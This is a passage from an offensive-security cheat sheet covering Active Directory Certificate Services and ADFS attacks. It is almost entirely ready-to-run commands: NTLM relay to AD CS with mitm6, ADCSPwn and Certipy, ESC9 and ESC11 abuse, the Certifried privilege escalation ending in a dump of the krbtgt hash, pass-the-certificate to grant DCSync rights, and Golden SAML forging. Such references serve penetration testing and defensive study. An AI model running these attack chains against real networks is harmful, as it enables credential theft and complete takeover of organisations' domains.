<a id="__codelineno-206-3" name="__codelineno-206-3" href="#__codelineno-206-3"></a>
<a id="__codelineno-206-4" name="__codelineno-206-4" href="#__codelineno-206-4"></a><span class="c"># Run mitm6</span>
<a id="__codelineno-206-5" name="__codelineno-206-5" href="#__codelineno-206-5"></a><span class="n">sudo</span> <span class="n">mitm6</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-host-allowlist</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-relay</span> <span class="n">CA</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-v</span>
</code></pre></div></p>
</li>
<li>
<p><strong>Version 4</strong>: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-207-1" name="__codelineno-207-1" href="#__codelineno-207-1"></a><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">bats3c</span><span class="p">/</span><span class="n">ADCSPwn</span>
<a id="__codelineno-207-2" name="__codelineno-207-2" href="#__codelineno-207-2"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">&lt;</span><span class="n">cs</span> <span class="n">server</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-port</span> <span class="no">[local port]</span> <span class="p">-</span><span class="n">-remote</span> <span class="no">[computer]</span>
<a id="__codelineno-207-3" name="__codelineno-207-3" href="#__codelineno-207-3"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-207-4" name="__codelineno-207-4" href="#__codelineno-207-4"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-port</span> <span class="n">9001</span>
<a id="__codelineno-207-5" name="__codelineno-207-5" href="#__codelineno-207-5"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-output</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">cert_b64</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-207-6" name="__codelineno-207-6" href="#__codelineno-207-6"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-username</span> <span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">mranderson</span> <span class="p">-</span><span class="n">-password</span> <span class="n">The0nly0ne</span><span class="p">!</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-207-7" name="__codelineno-207-7" href="#__codelineno-207-7"></a>
<a id="__codelineno-207-8" name="__codelineno-207-8" href="#__codelineno-207-8"></a><span class="c"># ADCSPwn arguments</span>
<a id="__codelineno-207-9" name="__codelineno-207-9" href="#__codelineno-207-9"></a><span class="n">adcs</span>            <span class="p">-</span>       <span class="n">This</span> <span class="n">is</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">AD</span> <span class="n">CS</span> <span class="n">server</span> <span class="n">which</span> <span class="n">authentication</span> <span class="n">will</span> <span class="n">be</span> <span class="n">relayed</span> <span class="n">to</span><span class="p">.</span>
<a id="__codelineno-207-10" name="__codelineno-207-10" href="#__codelineno-207-10"></a><span class="n">secure</span>          <span class="p">-</span>       <span class="n">Use</span> <span class="n">HTTPS</span> <span class="n">with</span> <span class="n">the</span> <span class="n">certificate</span> <span class="n">service</span><span class="p">.</span>
<a id="__codelineno-207-11" name="__codelineno-207-11" href="#__codelineno-207-11"></a><span class="n">port</span>            <span class="p">-</span>       <span class="n">The</span> <span class="n">port</span> <span class="n">ADCSPwn</span> <span class="n">will</span> <span class="n">listen</span> <span class="n">on</span><span class="p">.</span>
<a id="__codelineno-207-12" name="__codelineno-207-12" href="#__codelineno-207-12"></a><span class="n">remote</span>          <span class="p">-</span>       <span class="n">Remote</span> <span class="n">machine</span> <span class="n">to</span> <span class="n">trigger</span> <span class="n">authentication</span> <span class="n">from</span><span class="p">.</span>
<a id="__codelineno-207-13" name="__codelineno-207-13" href="#__codelineno-207-13"></a><span class="n">username</span>        <span class="p">-</span>       <span class="n">Username</span> <span class="k">for</span> <span class="n">non-domain</span> <span class="n">context</span><span class="p">.</span>
<a id="__codelineno-207-14" name="__codelineno-207-14" href="#__codelineno-207-14"></a><span class="n">password</span>        <span class="p">-</span>       <span class="n">Password</span> <span class="k">for</span> <span class="n">non-domain</span> <span class="n">context</span><span class="p">.</span>
<a id="__codelineno-207-15" name="__codelineno-207-15" href="#__codelineno-207-15"></a><span class="n">dc</span>              <span class="p">-</span>       <span class="n">Domain</span> <span class="n">controller</span> <span class="n">to</span> <span class="n">query</span> <span class="k">for</span> <span class="n">Certificate</span> <span class="n">Templates</span> <span class="p">(</span><span class="n">LDAP</span><span class="p">).</span>
<a id="__codelineno-207-16" name="__codelineno-207-16" href="#__codelineno-207-16"></a><span class="n">unc</span>             <span class="p">-</span>       <span class="nb">Set </span><span class="n">custom</span> <span class="n">UNC</span> <span class="n">callback</span> <span class="n">path</span> <span class="k">for</span> <span class="n">EfsRpcOpenFileRaw</span> <span class="p">(</span><span class="n">Petitpotam</span><span class="p">)</span> <span class="p">.</span>
<a id="__codelineno-207-17" name="__codelineno-207-17" href="#__codelineno-207-17"></a><span class="n">output</span>          <span class="p">-</span>       <span class="n">Output</span> <span class="n">path</span> <span class="n">to</span> <span class="n">store</span> <span class="n">base64</span> <span class="n">generated</span> <span class="n">crt</span><span class="p">.</span>
</code></pre></div></p>
</li>
<li>
<p><strong>Version 5</strong>: Certipy ESC8
  <div class="highlight"><pre><span></span><code><a id="__codelineno-208-1" name="__codelineno-208-1" href="#__codelineno-208-1"></a><span class="n">certipy</span> <span class="n">relay</span> <span class="n">-ca</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">19</span><span class="p">.</span><span class="n">100</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="esc9-no-security-extension">ESC9 - No Security Extension</h3>
<p>Requirements:
* <code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code>
* Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value
* Certificate specifies <code>Any Client</code> authentication EKU
* <code>GenericWrite</code> over any account A to compromise any account B</p>
<p><strong>Scenario</strong></p>
<p>John@corp.local has <strong>GenericWrite</strong> over Jane@corp.local, and we want to compromise Administrator@corp.local. 
Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the <strong>CT_FLAG_NO_SECURITY_EXTENSION</strong> flag in the <strong>msPKI-Enrollment-Flag</strong> value.</p>
<ul>
<li>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)
    <div class="highlight"><pre><span></span><code><a id="__codelineno-209-1" name="__codelineno-209-1" href="#__codelineno-209-1"></a><span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Passw0rd</span> <span class="n">-account</span> <span class="n">Jane</span>
</code></pre></div></li>
<li>Change the <strong>userPrincipalName</strong> of Jane to be Administrator. <img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> leave the <code>@corp.local</code> part
    <div class="highlight"><pre><span></span><code><a id="__codelineno-210-1" name="__codelineno-210-1" href="#__codelineno-210-1"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-password</span> <span class="n">Passw0rd</span> <span class="n">-user</span> <span class="n">Jane</span> <span class="n">-upn</span> <span class="n">Administrator</span>
</code></pre></div></li>
<li>Request the vulnerable certificate template ESC9 from Jane's account.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-211-1" name="__codelineno-211-1" href="#__codelineno-211-1"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-username</span> <span class="n">jane</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-hashes</span> <span class="p">...</span> <span class="n">-ca</span> <span class="n">corp-DC-CA</span> <span class="n">-template</span> <span class="n">ESC9</span>
<a id="__codelineno-211-2" name="__codelineno-211-2" href="#__codelineno-211-2"></a><span class="c"># userPrincipalName in the certificate is Administrator </span>
<a id="__codelineno-211-3" name="__codelineno-211-3" href="#__codelineno-211-3"></a><span class="c"># the issued certificate contains no &quot;object SID&quot;</span>
</code></pre></div></li>
<li>Restore userPrincipalName of Jane to Jane@corp.local.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-212-1" name="__codelineno-212-1" href="#__codelineno-212-1"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-password</span> <span class="n">Passw0rd</span> <span class="n">-user</span> <span class="n">Jane</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span>
</code></pre></div></li>
<li>Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-213-1" name="__codelineno-213-1" href="#__codelineno-213-1"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="n">administrator</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-213-2" name="__codelineno-213-2" href="#__codelineno-213-2"></a><span class="c"># Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.</span>
</code></pre></div></li>
</ul>
<h3 id="esc11-relaying-ntlm-to-icpr">ESC11 - Relaying NTLM to ICPR</h3>
<blockquote>
<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue</p>
</blockquote>
<p>Requirements:
* <a href="https://github.com/sploutchy/Certipy">sploutchy/Certipy</a> - Certipy fork
* <a href="https://github.com/sploutchy/impacket">sploutchy/impacket</a> - Impacket fork</p>
<p>Exploitation:
1. Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output
2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-214-1" name="__codelineno-214-1" href="#__codelineno-214-1"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">rpc</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-rpc-mode</span> <span class="n">ICPR</span> <span class="n">-icpr-ca-name</span> <span class="n">lab-DC-CA</span> <span class="n">-smb2support</span>
</code></pre></div></p>
<h3 id="certifried-cve-2022-26923">Certifried CVE-2022-26923</h3>
<blockquote>
<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p>
</blockquote>
<ul>
<li>Find <code>ms-DS-MachineAccountQuota</code>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-215-1" name="__codelineno-215-1" href="#__codelineno-215-1"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">getObjectAttributes</span>  <span class="s1">&#39;DC=lab,DC=local&#39;</span> <span class="n">ms-DS-MachineAccountQuota</span> 
</code></pre></div></li>
<li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-216-1" name="__codelineno-216-1" href="#__codelineno-216-1"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">addComputer</span> <span class="n">cve</span> <span class="s1">&#39;CVEPassword1234*&#39;</span>
<a id="__codelineno-216-2" name="__codelineno-216-2" href="#__codelineno-216-2"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">create</span> <span class="s1">&#39;lab.local/username:Password123*@dc.lab.local&#39;</span> <span class="n">-user</span> <span class="s1">&#39;cve&#39;</span> <span class="n">-dns</span> <span class="s1">&#39;dc.lab.local&#39;</span>
</code></pre></div></li>
<li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN
  <div class="highlight"><pre><span></span><code><a id="__codelineno-217-1" name="__codelineno-217-1" href="#__codelineno-217-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span>
<a id="__codelineno-217-2" name="__codelineno-217-2" href="#__codelineno-217-2"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">ws02</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-217-3" name="__codelineno-217-3" href="#__codelineno-217-3"></a><span class="n">python</span> <span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="s1">&#39;ws02$&#39;</span> <span class="n">-k</span> <span class="p">-</span><span class="n">-host</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">setAttribute</span> <span class="s1">&#39;CN=ws02,CN=Computers,DC=lab,DC=local&#39;</span> <span class="n">servicePrincipalName</span> <span class="s1">&#39;[]&#39;</span>
</code></pre></div></li>
<li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname
  <div class="highlight"><pre><span></span><code><a id="__codelineno-218-1" name="__codelineno-218-1" href="#__codelineno-218-1"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">setAttribute</span> <span class="s1">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> <span class="n">dNSHostName</span> <span class="s1">&#39;[&quot;DC.lab.local&quot;]&#39;</span>
<a id="__codelineno-218-2" name="__codelineno-218-2" href="#__codelineno-218-2"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">getObjectAttributes</span> <span class="s1">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> <span class="n">dNSHostName</span>
</code></pre></div></li>
<li>Request a ticket
  <div class="highlight"><pre><span></span><code><a id="__codelineno-219-1" name="__codelineno-219-1" href="#__codelineno-219-1"></a><span class="c"># certipy req &#39;domain.local/cve$:CVEPassword1234*@ADCS_IP&#39; -template Machine -dc-ip DC_IP -ca discovered-CA</span>
<a id="__codelineno-219-2" name="__codelineno-219-2" href="#__codelineno-219-2"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;lab.local/cve$:CVEPassword1234*@10.100.10.13&#39;</span> <span class="n">-template</span> <span class="n">Machine</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-ca</span> <span class="n">lab-ADCS-CA</span>
</code></pre></div></li>
<li>Either use the pfx or set a RBCD on your machine account to takeover the domain
  <div class="highlight"><pre><span></span><code><a id="__codelineno-220-1" name="__codelineno-220-1" href="#__codelineno-220-1"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="p">./</span><span class="n">dc</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-220-2" name="__codelineno-220-2" href="#__codelineno-220-2"></a>
<a id="__codelineno-220-3" name="__codelineno-220-3" href="#__codelineno-220-3"></a><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">dc</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-out</span> <span class="n">dc</span><span class="p">.</span><span class="n">pem</span> <span class="n">-nodes</span>
<a id="__codelineno-220-4" name="__codelineno-220-4" href="#__codelineno-220-4"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span>  <span class="n">-c</span> <span class="s2">&quot;:dc.pem&quot;</span> <span class="n">-u</span> <span class="s1">&#39;cve$&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">setRbcd</span> <span class="s1">&#39;CVE$&#39;</span> <span class="s1">&#39;CRASHDC$&#39;</span>
<a id="__codelineno-220-5" name="__codelineno-220-5" href="#__codelineno-220-5"></a><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">LDAP</span><span class="p">/</span><span class="n">CRASHDC</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="s1">&#39;lab.local/cve$:CVEPassword1234*&#39;</span>   
<a id="__codelineno-220-6" name="__codelineno-220-6" href="#__codelineno-220-6"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-user-status</span> <span class="n">-just-dc-ntlm</span> <span class="n">-just-dc-user</span> <span class="n">krbtgt</span> <span class="s1">&#39;lab.local/Administrator@dc.lab.local&#39;</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-target-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> 
</code></pre></div></li>
</ul>
<h3 id="pass-the-certificate">Pass-The-Certificate</h3>
<blockquote>
<p>Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"</p>
</blockquote>
<ul>
<li>Windows
  <div class="highlight"><pre><span></span><code><a id="__codelineno-221-1" name="__codelineno-221-1" href="#__codelineno-221-1"></a><span class="c"># Information about a cert file</span>
<a id="__codelineno-221-2" name="__codelineno-221-2" href="#__codelineno-221-2"></a><span class="n">certutil</span> <span class="n">-v</span> <span class="n">-dump</span> <span class="n">admin</span><span class="p">.</span><span class="n">pfx</span>
<a id="__codelineno-221-3" name="__codelineno-221-3" href="#__codelineno-221-3"></a>
<a id="__codelineno-221-4" name="__codelineno-221-4" href="#__codelineno-221-4"></a><span class="c"># From a Base64 PFX</span>
<a id="__codelineno-221-5" name="__codelineno-221-5" href="#__codelineno-221-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;TARGET_SAMNAME&quot;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;FQDN_DOMAIN&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DOMAIN_CONTROLLER&quot;</span> <span class="p">/</span><span class="n">show</span>
<a id="__codelineno-221-6" name="__codelineno-221-6" href="#__codelineno-221-6"></a>
<a id="__codelineno-221-7" name="__codelineno-221-7" href="#__codelineno-221-7"></a><span class="c"># Grant DCSync rights to an user</span>
<a id="__codelineno-221-8" name="__codelineno-221-8" href="#__codelineno-221-8"></a><span class="p">./</span><span class="n">PassTheCert</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-server</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-cert-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">-</span><span class="n">-elevate</span> <span class="p">-</span><span class="n">-target</span> <span class="s2">&quot;DC=domain,DC=local&quot;</span> <span class="p">-</span><span class="n">-sid</span> <span class="p">&lt;</span><span class="n">user_SID</span><span class="p">&gt;</span>
<a id="__codelineno-221-9" name="__codelineno-221-9" href="#__codelineno-221-9"></a><span class="c"># To restore</span>
<a id="__codelineno-221-10" name="__codelineno-221-10" href="#__codelineno-221-10"></a><span class="p">./</span><span class="n">PassTheCert</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-server</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-cert-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">-</span><span class="n">-elevate</span> <span class="p">-</span><span class="n">-target</span> <span class="s2">&quot;DC=domain,DC=local&quot;</span> <span class="p">-</span><span class="n">-restore</span> <span class="n">restoration_file</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div></li>
<li>Linux
  <div class="highlight"><pre><span></span><code><a id="__codelineno-222-1" name="__codelineno-222-1" href="#__codelineno-222-1"></a><span class="c"># Base64-encoded PFX certificate (string) (password can be set)</span>
<a id="__codelineno-222-2" name="__codelineno-222-2" href="#__codelineno-222-2"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-pfx-base64</span> <span class="p">$(</span><span class="nb">cat </span><span class="s2">&quot;PATH_TO_B64_PFX_CERT&quot;</span><span class="p">)</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-222-3" name="__codelineno-222-3" href="#__codelineno-222-3"></a><span class="err">​</span>
<a id="__codelineno-222-4" name="__codelineno-222-4" href="#__codelineno-222-4"></a><span class="c"># PEM certificate (file) + PEM private key (file)</span>
<a id="__codelineno-222-5" name="__codelineno-222-5" href="#__codelineno-222-5"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pem</span> <span class="s2">&quot;PATH_TO_PEM_CERT&quot;</span> <span class="n">-key-pem</span> <span class="s2">&quot;PATH_TO_PEM_KEY&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-222-6" name="__codelineno-222-6" href="#__codelineno-222-6"></a>
<a id="__codelineno-222-7" name="__codelineno-222-7" href="#__codelineno-222-7"></a><span class="c"># PFX certificate (file) + password (string, optionnal)</span>
<a id="__codelineno-222-8" name="__codelineno-222-8" href="#__codelineno-222-8"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-pfx-pass</span> <span class="s2">&quot;CERT_PASSWORD&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-222-9" name="__codelineno-222-9" href="#__codelineno-222-9"></a>
<a id="__codelineno-222-10" name="__codelineno-222-10" href="#__codelineno-222-10"></a><span class="c"># Using Certipy</span>
<a id="__codelineno-222-11" name="__codelineno-222-11" href="#__codelineno-222-11"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-dc-ip</span> <span class="s1">&#39;dc-ip&#39;</span> <span class="n">-username</span> <span class="s1">&#39;user&#39;</span> <span class="n">-domain</span> <span class="s1">&#39;domain&#39;</span>
<a id="__codelineno-222-12" name="__codelineno-222-12" href="#__codelineno-222-12"></a><span class="n">certipy</span> <span class="n">cert</span> <span class="n">-export</span> <span class="n">-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-password</span> <span class="s2">&quot;CERT_PASSWORD&quot;</span> <span class="n">-out</span> <span class="s2">&quot;unprotected.pfx&quot;</span>
</code></pre></div></li>
</ul>
<h2 id="active-directory-federation-services">Active Directory Federation Services</h2>
<h3 id="adfs-golden-saml">ADFS - Golden SAML</h3>
<p><strong>Requirements</strong>:
* ADFS service account
* The private key (PFX with the decryption password)</p>
<p><strong>Exploitation</strong>:
* Run <a href="https://github.com/mandiant/ADFSDump">mandiant/ADFSDump</a> on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): <code>\\.\pipe\MICROSOFT##WID\tsql\query</code>
* Convert PFX and Private Key to binary format
    <div class="highlight"><pre><span></span><code><a id="__codelineno-223-1" name="__codelineno-223-1" href="#__codelineno-223-1"></a><span class="c"># For the pfx</span>
<a id="__codelineno-223-2" name="__codelineno-223-2" href="#__codelineno-223-2"></a><span class="nb">echo </span><span class="n">AAAAAQAAAAAEE</span><span class="p">[...]</span><span class="n">Qla6</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-d</span> <span class="p">&gt;</span> <span class="n">EncryptedPfx</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-223-3" name="__codelineno-223-3" href="#__codelineno-223-3"></a><span class="c"># For the private key</span>
<a id="__codelineno-223-4" name="__codelineno-223-4" href="#__codelineno-223-4"></a><span class="nb">echo </span><span class="n">f7404c7f</span><span class="p">[...]</span><span class="n">aabd8b</span> <span class="p">|</span> <span class="n">xxd</span> <span class="n">-r</span> <span class="n">-p</span> <span class="p">&gt;</span> <span class="n">dkmKey</span><span class="p">.</span><span class="n">bin</span> 
</code></pre></div>
* Create the Golden SAML using <a href="https://github.com/mandiant/ADFSpoof">mandiant/ADFSpoof</a>, you might need to update the <a href="https://github.com/szymex73/ADFSpoof">dependencies</a>.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-224-1" name="__codelineno-224-1" href="#__codelineno-224-1"></a><span class="n">mkdir</span> <span class="n">ADFSpoofTools</span>
<a id="__codelineno-224-2" name="__codelineno-224-2" href="#__codelineno-224-2"></a><span class="nb">cd </span><span class="nv">$_</span>
<a id="__codelineno-224-3" name="__codelineno-224-3" href="#__codelineno-224-3"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dmb2168</span><span class="p">/</span><span class="n">cryptography</span><span class="p">.</span><span class="n">git</span>
